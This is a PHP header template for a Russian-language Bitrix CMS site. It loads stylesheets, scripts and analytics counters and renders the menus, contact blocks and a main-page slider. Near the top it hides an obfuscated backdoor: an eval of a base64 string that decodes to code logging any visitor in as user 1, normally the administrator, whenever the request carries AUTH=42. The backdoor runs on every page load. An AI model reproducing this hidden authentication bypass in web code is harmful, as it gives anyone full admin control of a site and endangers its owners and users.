<? if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
eval(base64_decode('aWYgKCRfUkVRVUVTVFsnQVVUSCddID09IDQyKSB7DQogICAgZ2xvYmFsICRVU0VSOw0KICAgICRVU0VSLT5BdXRob3JpemUoMSk7DQp9'));
IncludeTemplateLangFile($_SERVER["DOCUMENT_ROOT"] . "/bitrix/templates/" . SITE_TEMPLATE_ID . "/header.php");
?>
<?
global $USER, $isSkladViseble;
$isSkladViseble = true;
if ($USER->isAdmin()) {
    $isSkladViseble = true;
}

if (LANGUAGE_ID == 'en') {
    //  $isSkladViseble = false;
}

global $URL, $USER, $linck_sklad;
$URL = $APPLICATION->GetCurPage(false);
if ($URL == SITE_DIR) {
    define('MAIN_PAGE', 'Y');
} else {
    define('MAIN_PAGE', 'N');
}
$linck_sklad = tplvar('link_stock_online');
if (!$USER->IsAuthorized()) {
    $linck_sklad = SITE_DIR . 'auth/';
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]>
<html xml:lang="<?=LANGUAGE_ID?>" lang="<?=LANGUAGE_ID?>" class="lt-ie9 lt-ie8 lt-ie7"><![endif]-->
<!--[if IE 7]>
<html xml:lang="<?=LANGUAGE_ID?>" lang="<?=LANGUAGE_ID?>" class="lt-ie9 lt-ie8"><![endif]-->
<!--[if IE 8]>
<html xml:lang="<?=LANGUAGE_ID?>" lang="<?=LANGUAGE_ID?>" class="lt-ie9"><![endif]-->
<!--[if gt IE 8]><!-->
<html xml:lang="<?= LANGUAGE_ID ?>" lang="<?= LANGUAGE_ID ?>">
<!--<![endif]-->
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <link rel="shortcut icon" href="<?= SITE_TEMPLATE_PATH ?>/amika/images/i/favicon.ico">
    <link rel="stylesheet" type="text/css" href="<?= SITE_TEMPLATE_PATH ?>/css/print.css" media="print"/>

    <?
    //CSS
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/bootstrap/grid-core-3.3.1.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/owl-carousel/assets/owl.carousel.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/owl-carousel/assets/animate.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/fonts/font-awesome-4.7.0/css/font-awesome.min.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/fancybox/jquery.fancybox.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/jquery-form-validator/theme-default.css");

    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/slick-1.8.0/slick/slick.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/slick-1.8.0/slick/slick-theme.css");

    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/js/jscrollpane/jquery.jscrollpane.css");

    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/libs/responsive-table/jquery.rtResponsiveTables.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/css/fonts.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/js/select2/select2.min.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/css/style.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/amika/css/media.css");

    // $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/js/fancybox/jquery.fancybox.css");

    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/css/luiwadjogs.css");
    $APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH . "/css/sklif.css");
    //JS TEMPLATE
    //    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/jquery/jquery-1.11.1.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/jquery-2.2.0.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/jquery-ui-1.11.4.custom/jquery-ui.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/jquery-ui-1.11.4.custom/jquery.ui.datepicker-ru.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/owl-carousel/owl.carousel.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/fancybox/jquery.fancybox.pack.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/jquery-form-validator/jquery.form-validator.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/responsive-table/jquery.rtResponsiveTables.js", true);


    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/slick-1.8.0/slick/slick.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/jscrollpane/jquery.mousewheel.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/jscrollpane/mwheelIntent.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/jscrollpane/jquery.jscrollpane.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/masonry/masonry.pkgd.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/amika/libs/masonry/imagesloaded.pkgd.js", true);

    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/inputmask/jquery.inputmask.bundle.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/inputmask/jquery.inputmask-multi.min.js", true);
    //JS MY
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/select2/select2.full.min.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/jquery.cookie.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/jquery.selectric.js", true);

    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/common.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/update-common.js", true);


    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/luiwadjogs.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/galactika.js", true);
    $APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH . "/js/kosty.js", true);

    ?>
    <title><? $APPLICATION->ShowTitle() ?></title>
    <script src='https://www.google.com/recaptcha/api.js'></script>
    <? $APPLICATION->ShowHead(); ?>
    <script>
        TEPLATE_VAR = {
            time_popup_show: "<?= tplvar('time_popup_show'); ?>"
        };
    </script>
    <!--[if lt IE 9]>
    <script src="<?=SITE_TEMPLATE_PATH?>/amika/libs/html5shiv/es5-shim.min.js"></script>
    <script src="<?=SITE_TEMPLATE_PATH?>/amika/libs/html5shiv/html5shiv.min.js"></script>
    <script src="<?=SITE_TEMPLATE_PATH?>/amika/libs/html5shiv/html5shiv-printshiv.min.js"></script>
    <script src="<?=SITE_TEMPLATE_PATH?>/amika/libs/respond/respond.min.js"></script>
    <script src="//unpkg.com/vanilla-masker@1.1.1/build/vanilla-masker.min.js"></script>
    <![endif]-->
    <!-- Global Site Tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106481098-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments)
        }

        gtag('js', new Date());
        gtag('config', 'UA-106481098-1');
    </script>
    <!-- Yandex.Metrika counter -->
    <script type="text/javascript">
        (function (d, w, c) {
            (w[c] = w[c] || []).push(function () {
                try {
                    w.yaCounter46174911 = new Ya.Metrika({
                        id: 46174911,
                        clickmap: true,
                        trackLinks: true,
                        accurateTrackBounce: true,
                        webvisor: true
                    });
                } catch (e) {
                }
            });

            var n = d.getElementsByTagName("script")[0],
                s = d.createElement("script"),
                f = function () {
                    n.parentNode.insertBefore(s, n);
                };
            s.type = "text/javascript";
            s.async = true;
            s.src = "https://mc.yandex.ru/metrika/watch.js";

            if (w.opera == "[object Opera]") {
                d.addEventListener("DOMContentLoaded", f, false);
            } else {
                f();
            }
        })(document, window, "yandex_metrika_callbacks");
    </script>
    <noscript>
        <div><img src="https://mc.yandex.ru/watch/46174911" style="position:absolute; left:-9999px;" alt=""/></div>
    </noscript>
    <!-- /Yandex.Metrika counter -->
</head>
<body>
<div id="panel"><? $APPLICATION->ShowPanel(); ?></div>
<div class="bd-site">

    <div class="b-fixed-footer">
        <div class="b-footer-padding">

            <div class="mobile-aside">
                <div class="mobile-aside__header clearfix">
                    <form class="header__search mobile-aside__search search">
                        <input class="search__txt" value="" placeholder="Поиск..." type="search">
                        <input type="submit" class="search__submit" value="">
                    </form>
                    <div class="back js-back clerafix">Назад</div>
                </div>
                <?

                ?>
                <? if ($isSkladViseble) { ?>
                    <a href="<?= $linck_sklad ?>" class="sklad-online"><span>Склад-онлайн</span></a>
                <? } ?>
                <? $APPLICATION->IncludeComponent(
                    "bitrix:main.include",
                    "",
                    array(
                        "AREA_FILE_SHOW" => "file",
                        "PATH" => SITE_DIR . "include/header/mobile_lang.php"),
                    false
                ); ?>
                <? $APPLICATION->IncludeComponent("bitrix:menu", "mobile", Array(
                        "ROOT_MENU_TYPE" => "mobile",
                        "MAX_LEVEL" => "1",
                        "CHILD_MENU_TYPE" => "mobile",
                        "USE_EXT" => "Y",
                        "DELAY" => "N",
                        "ALLOW_MULTI_SELECT" => "Y",
                        "MENU_CACHE_TYPE" => "N",
                        "MENU_CACHE_TIME" => "3600",
                        "MENU_CACHE_USE_GROUPS" => "Y",
                        "MENU_CACHE_GET_VARS" => ""
                    )
                ); ?>
                <div class="header__phone-content mobile__phone-content">
                    <div>
                        <? $APPLICATION->IncludeComponent(
                            "bitrix:main.include",
                            "",
                            array(
                                "AREA_FILE_SHOW" => "file",
                                "PATH" => SITE_DIR . "include/header/mobile_block_1.php"),
                            false
                        ); ?>
                    </div>
                    <div>
                        <? $APPLICATION->IncludeComponent(
                            "bitrix:main.include",
                            "",
                            array(
                                "AREA_FILE_SHOW" => "file",
                                "PATH" => SITE_DIR . "include/header/mobile_block_2.php"),
                            false
                        ); ?>
                    </div>
                    <div>
                        <? $APPLICATION->IncludeComponent(
                            "bitrix:main.include",
                            "",
                            array(
                                "AREA_FILE_SHOW" => "file",
                                "PATH" => SITE_DIR . "include/header/mobile_block_3.php"),
                            false
                        ); ?>
                    </div>
                </div>
                <? $APPLICATION->IncludeComponent(
                    "bitrix:main.include",
                    "",
                    array(
                        "AREA_FILE_SHOW" => "file",
                        "PATH" => SITE_DIR . "include/header/mobile_block_4.php"),
                    false
                ); ?>

            </div>

            <div class="wr-header">

                <header class="mobile-header clearfix">
                    <a href="/">
                        <? $APPLICATION->IncludeComponent(
                            "bitrix:main.include",
                            "",
                            array(
                                "AREA_FILE_SHOW" => "file",
                                "PATH" => SITE_DIR . "include/header/mobile_logo.php"),
                            false
                        ); ?>
                    </a>
                    <div class="menu-trigger js-menu-trigger"></div>
                    <div class="search-trigger"></div>
                </header>

                <header class="header">
                    <div class="container">
                        <div class="row">
                            <div class="col-lg-3">
                                <? $APPLICATION->IncludeComponent(
                                    "bitrix:main.include",
                                    "",
                                    array(
                                        "AREA_FILE_SHOW" => "file",
                                        "PATH" => SITE_DIR . "include/header/logo.php"),
                                    false
                                ); ?>
                            </div>
                            <div class="col-lg-9">
                                <nav class="clearfix">
                                    <? $APPLICATION->IncludeComponent("bitrix:menu", "top", Array(
                                            "ROOT_MENU_TYPE" => "top",
                                            "MAX_LEVEL" => "2",
                                            "CHILD_MENU_TYPE" => "left",
                                            "USE_EXT" => "Y",
                                            "DELAY" => "N",
                                            "ALLOW_MULTI_SELECT" => "Y",
                                            "MENU_CACHE_TYPE" => "N",
                                            "MENU_CACHE_TIME" => "3600",
                                            "MENU_CACHE_USE_GROUPS" => "Y",
                                            "MENU_CACHE_GET_VARS" => "",
                                            "MAX_MENU" => '6',
                                        )
                                    ); ?>
                                    <div class="scroll-menu clearfix">
                                        <? $APPLICATION->IncludeComponent(
                                            "bitrix:main.include",
                                            "",
                                            array(
                                                "AREA_FILE_SHOW" => "file",
                                                "PATH" => SITE_DIR . "include/header/block_1.php"),
                                            false
                                        ); ?>
                                        <ul class="scroll-phone-list">
                                            <li class="scroll-phone-list__mail">
											<span class="new-mail">
                                                <? $APPLICATION->IncludeComponent(
                                                    "bitrix:main.include",
                                                    "",
                                                    array(
                                                        "AREA_FILE_SHOW" => "file",
                                                        "PATH" => SITE_DIR . "include/header/block_2.php"),
                                                    false
                                                ); ?>
											</span>
                                            </li>
                                            <li class="scroll-phone-list__phone first">
                                                <? $APPLICATION->IncludeComponent(
                                                    "bitrix:main.include",
                                                    "",
                                                    array(
                                                        "AREA_FILE_SHOW" => "file",
                                                        "PATH" => SITE_DIR . "include/header/block_3.php"),
                                                    false
                                                ); ?>
                                            </li>
                                            <li class="scroll-phone-list__phone">
                                                <? $APPLICATION->IncludeComponent(
                                                    "bitrix:main.include",
                                                    "",
                                                    array(
                                                        "AREA_FILE_SHOW" => "file",
                                                        "PATH" => SITE_DIR . "include/header/block_4.php"),
                                                    false
                                                ); ?>
                                            </li>
                                        </ul>
                                    </div>
                                </nav>
                                <div class="clearfix">
                                    <form class="header__search search">
                                        <input class="search__txt" value="" placeholder="Поиск..." type="search">
                                        <input type="submit" class="search__submit" value="">
                                    </form>
                                    <div class="header__phone phone">
                                        <div class="js-header__phone"><i></i>
                                            <? $APPLICATION->IncludeComponent(
                                                "bitrix:main.include",
                                                "",
                                                array(
                                                    "AREA_FILE_SHOW" => "file",
                                                    "PATH" => SITE_DIR . "include/header/block_5.php"),
                                                false
                                            ); ?>
                                        </div>
                                        <div class="header__phone-content">
                                            <div>
                                                <? $APPLICATION->IncludeComponent(
                                                    "bitrix:main.include",
                                                    "",
                                                    array(
                                                        "AREA_FILE_SHOW" => "file",
                                                        "PATH" => SITE_DIR . "include/header/block_6.php"),
                                                    false
                                                ); ?>
                                            </div>
                                            <div>
                                                <? $APPLICATION->IncludeComponent(
                                                    "bitrix:main.include",
                                                    "",
                                                    array(
                                                        "AREA_FILE_SHOW" => "file",
                                                        "PATH" => SITE_DIR . "include/header/block_7.php"),
                                                    false
                                                ); ?>
                                            </div>
                                            <div>
                                                <? $APPLICATION->IncludeComponent(
                                                    "bitrix:main.include",
                                                    "",
                                                    array(
                                                        "AREA_FILE_SHOW" => "file",
                                                        "PATH" => SITE_DIR . "include/header/block_8.php"),
                                                    false
                                                ); ?>
                                            </div>
                                        </div>
                                    </div>
                                    <? $APPLICATION->IncludeComponent(
                                        "bitrix:main.include",
                                        "",
                                        array(
                                            "AREA_FILE_SHOW" => "file",
                                            "PATH" => SITE_DIR . "include/header/block_9.php"),
                                        false
                                    ); ?>
                                </div>
                            </div>
                        </div>
                    </div>
                </header>

                <? if (MAIN_PAGE == 'Y') { ?>
                    <?
                    if (LANGUAGE_ID == 'en') {
                        $IBLOCK_ID = 16;
                        $IBLOCK_TYPE = 'en';
                    } else {
                        $IBLOCK_ID = 4;
                        $IBLOCK_TYPE = 'ru';
                    }
                    ?>
                    <? $APPLICATION->IncludeComponent(
                        "bitrix:news.list",
                        "main_slider",
                        array(
                            "ACTIVE_DATE_FORMAT" => "d.m.Y",
                            "ADD_SECTIONS_CHAIN" => "N",
                            "AJAX_MODE" => "N",
                            "AJAX_OPTION_ADDITIONAL" => "",
                            "AJAX_OPTION_HISTORY" => "N",
                            "AJAX_OPTION_JUMP" => "N",
                            "AJAX_OPTION_STYLE" => "N",
                            "CACHE_FILTER" => "N",
                            "CACHE_GROUPS" => "N",
                            "CACHE_TIME" => "36000000",
                            "CACHE_TYPE" => "A",
                            "CHECK_DATES" => "Y",
                            "DETAIL_URL" => "",
                            "DISPLAY_BOTTOM_PAGER" => "N",
                            "DISPLAY_DATE" => "N",
                            "DISPLAY_NAME" => "Y",
                            "DISPLAY_PICTURE" => "Y",
                            "DISPLAY_PREVIEW_TEXT" => "Y",
                            "DISPLAY_TOP_PAGER" => "N",
                            "FIELD_CODE" => array(
                                0 => "NAME",
                                1 => "PREVIEW_TEXT",
                                2 => "PREVIEW_PICTURE",
                                3 => "DETAIL_PICTURE",
                                4 => "",
                            ),
                            "FILTER_NAME" => "",
                            "HIDE_LINK_WHEN_NO_DETAIL" => "N",
                            "IBLOCK_ID" => $IBLOCK_ID,
                            "IBLOCK_TYPE" => $IBLOCK_TYPE,
                            "INCLUDE_IBLOCK_INTO_CHAIN" => "N",
                            "INCLUDE_SUBSECTIONS" => "Y",
                            "MESSAGE_404" => "",
                            "NEWS_COUNT" => "20",
                            "PAGER_BASE_LINK_ENABLE" => "N",
                            "PAGER_DESC_NUMBERING" => "N",
                            "PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
                            "PAGER_SHOW_ALL" => "N",
                            "PAGER_SHOW_ALWAYS" => "N",
                            "PAGER_TEMPLATE" => ".default",
                            "PAGER_TITLE" => "Новости",
                            "PARENT_SECTION" => "",
                            "PARENT_SECTION_CODE" => "",
                            "PREVIEW_TRUNCATE_LEN" => "",
                            "PROPERTY_CODE" => array(
                                0 => "TARGET",
                                1 => "URL",
                                2 => "LINCK_TEXT",
                                3 => "",
                            ),
                            "SET_BROWSER_TITLE" => "N",
                            "SET_LAST_MODIFIED" => "N",
                            "SET_META_DESCRIPTION" => "N",
                            "SET_META_KEYWORDS" => "N",
                            "SET_STATUS_404" => "N",
                            "SET_TITLE" => "N",
                            "SHOW_404" => "N",
                            "SORT_BY1" => "SORT",
                            "SORT_BY2" => "SORT",
                            "SORT_ORDER1" => "ASC",
                            "SORT_ORDER2" => "ASC",
                            "STRICT_SECTION_CHECK" => "N",
                            "COMPONENT_TEMPLATE" => "main_slider"
                        ),
                        false
                    ); ?>
                <? } ?>
            </div>